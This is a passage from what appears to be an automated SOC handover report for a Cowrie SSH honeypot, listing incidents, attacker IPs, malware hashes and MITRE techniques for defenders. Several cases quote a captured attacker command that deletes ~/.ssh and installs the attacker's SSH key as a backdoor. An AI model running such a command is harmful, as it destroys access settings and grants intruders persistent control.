| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:16:35` | `cowrie.session.connect` |
| `2026-05-10 13:16:35` | `cowrie.client.version` |
| `2026-05-10 13:16:35` | `cowrie.client.kex` |
| `2026-05-10 13:16:36` | `cowrie.login.success` |
| `2026-05-10 13:16:37` | `cowrie.session.params` |
| `2026-05-10 13:16:37` | `cowrie.command.input` |
| `2026-05-10 13:16:37` | `cowrie.command.failed` |
| `2026-05-10 13:16:37` | `cowrie.log.closed` |
| `2026-05-10 13:16:38` | `cowrie.session.params` |
| `2026-05-10 13:16:38` | `cowrie.command.input` |
| `2026-05-10 13:16:38` | `cowrie.session.file_download` |
| `2026-05-10 13:16:38` | `cowrie.log.closed` |
| `2026-05-10 13:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-502785174613

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:16 |
| **Last Seen** | 2026-05-10 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:16:41` | `cowrie.session.connect` |
| `2026-05-10 13:16:41` | `cowrie.client.version` |
| `2026-05-10 13:16:41` | `cowrie.client.kex` |
| `2026-05-10 13:16:42` | `cowrie.login.success` |
| `2026-05-10 13:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a8b876aef1b

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-10 13:22 |
| **Last Seen** | 2026-05-10 13:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:22:14` | `cowrie.session.connect` |
| `2026-05-10 13:22:14` | `cowrie.client.version` |
| `2026-05-10 13:22:14` | `cowrie.client.kex` |
| `2026-05-10 13:22:15` | `cowrie.login.success` |
| `2026-05-10 13:22:16` | `cowrie.session.params` |
| `2026-05-10 13:22:16` | `cowrie.command.input` |
| `2026-05-10 13:22:16` | `cowrie.command.failed` |
| `2026-05-10 13:22:16` | `cowrie.log.closed` |
| `2026-05-10 13:22:17` | `cowrie.session.params` |
| `2026-05-10 13:22:17` | `cowrie.command.input` |
| `2026-05-10 13:22:17` | `cowrie.session.file_download` |
| `2026-05-10 13:22:17` | `cowrie.log.closed` |
| `2026-05-10 13:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e039ae6e2d

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-10 13:22 |
| **Last Seen** | 2026-05-10 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:22:20` | `cowrie.session.connect` |
| `2026-05-10 13:22:20` | `cowrie.client.version` |
| `2026-05-10 13:22:21` | `cowrie.client.kex` |
| `2026-05-10 13:22:22` | `cowrie.login.success` |
| `2026-05-10 13:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cb45fb80bd2

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:24 |
| **Last Seen** | 2026-05-10 13:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:24:02` | `cowrie.session.connect` |
| `2026-05-10 13:24:02` | `cowrie.client.version` |
| `2026-05-10 13:24:02` | `cowrie.client.kex` |
| `2026-05-10 13:24:04` | `cowrie.login.success` |
| `2026-05-10 13:24:06` | `cowrie.session.params` |
| `2026-05-10 13:24:06` | `cowrie.command.input` |
| `2026-05-10 13:24:06` | `cowrie.command.failed` |
| `2026-05-10 13:24:06` | `cowrie.log.closed` |
| `2026-05-10 13:24:07` | `cowrie.session.params` |
| `2026-05-10 13:24:07` | `cowrie.command.input` |
| `2026-05-10 13:24:08` | `cowrie.session.file_download` |
| `2026-05-10 13:24:08` | `cowrie.log.closed` |
| `2026-05-10 13:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-625354fce986

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:24 |
| **Last Seen** | 2026-05-10 13:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:24:15` | `cowrie.session.connect` |
| `2026-05-10 13:24:15` | `cowrie.client.version` |
| `2026-05-10 13:24:15` | `cowrie.client.kex` |
| `2026-05-10 13:24:18` | `cowrie.login.success` |
| `2026-05-10 13:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.112[.]106` | **30** | 2026-05-10 12:27 | 2026-05-10 12:45 | 42m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `97.93.43[.]157` | **30** | 2026-05-10 11:24 | 2026-05-10 11:57 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.145.131[.]27` | **29** | 2026-05-10 11:08 | 2026-05-10 12:32 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.12.74[.]119` | **28** | 2026-05-10 11:28 | 2026-05-10 11:52 | 42m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.253.251[.]7` | **25** | 2026-05-10 12:37 | 2026-05-10 13:25 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.75.83[.]180` | **18** | 2026-05-10 11:19 | 2026-05-10 11:19 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `218.4.91[.]162` | **16** | 2026-05-10 12:25 | 2026-05-10 13:11 | 21m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `218.4.91[.]163` | **14** | 2026-05-10 12:48 | 2026-05-10 13:10 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `150.136.129[.]10` | **8** | 2026-05-10 11:53 | 2026-05-10 13:25 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `150.95.25[.]34` | **5** | 2026-05-10 11:26 | 2026-05-10 13:17 | 3m | 0 | `T1592` | 🟢 LOW |
| `118.145.166[.]76` | **4** | 2026-05-10 11:35 | 2026-05-10 11:45 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.38.149[.]131` | **2** | 2026-05-10 12:46 | 2026-05-10 12:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]41` | **2** | 2026-05-10 11:42 | 2026-05-10 11:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.143.162[.]210` | **2** | 2026-05-10 12:19 | 2026-05-10 12:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]95` | 1 | 2026-05-10 11:33 | 2026-05-10 11:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-05-10 11:02 | 2026-05-10 11:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.98.230[.]202` | 1 | 2026-05-10 11:53 | 2026-05-10 11:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.244.212[.]73` | 1 | 2026-05-10 11:29 | 2026-05-10 11:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]214` | 1 | 2026-05-10 11:03 | 2026-05-10 11:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `153.99.92[.]11` | 1 | 2026-05-10 11:03 | 2026-05-10 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-05-10 11:55 | 2026-05-10 11:55 | 10s | 0 | `T1592` | 🟢 LOW |
| `176.251.64[.]35` | 1 | 2026-05-10 13:10 | 2026-05-10 13:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]26` | 1 | 2026-05-10 11:52 | 2026-05-10 11:52 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `218.56.160[.]82` | 1 | 2026-05-10 11:02 | 2026-05-10 11:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.207.209[.]130` | 1 | 2026-05-10 12:57 | 2026-05-10 12:57 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.207.209[.]130` | US | Amazon Technologies Inc. | **100** ⚠️ | 26 |
| `193.24.211[.]100` | BG | Layer7 Networks GmbH | **100** ⚠️ | 4 |
| `176.251.64[.]35` | GB | Sky UK Limited | **100** ⚠️ | 11 |
| `185.38.149[.]131` | GB | Hydra Communications Ltd | **100** ⚠️ | 50 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `118.145.131[.]27` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 3 |
| `218.4.91[.]163` | CN | The Administrative of Trade Town, Changshu City | **100** ⚠️ | 50 |
| `106.12.74[.]119` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 21 |
| `218.4.91[.]162` | CN | The Administrative of Trade Town, Changshu City | **100** ⚠️ | 38 |
| `72.253.251[.]7` | US | HAWAIIAN TELCOM | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 261 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 127 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 53 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 290 cases |
| Tool 34  | Credential Extractor        | ✅ 182 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (4.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 25 recon entry/entries in table (14 group(s) consolidating 213 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T13:27:07Z_
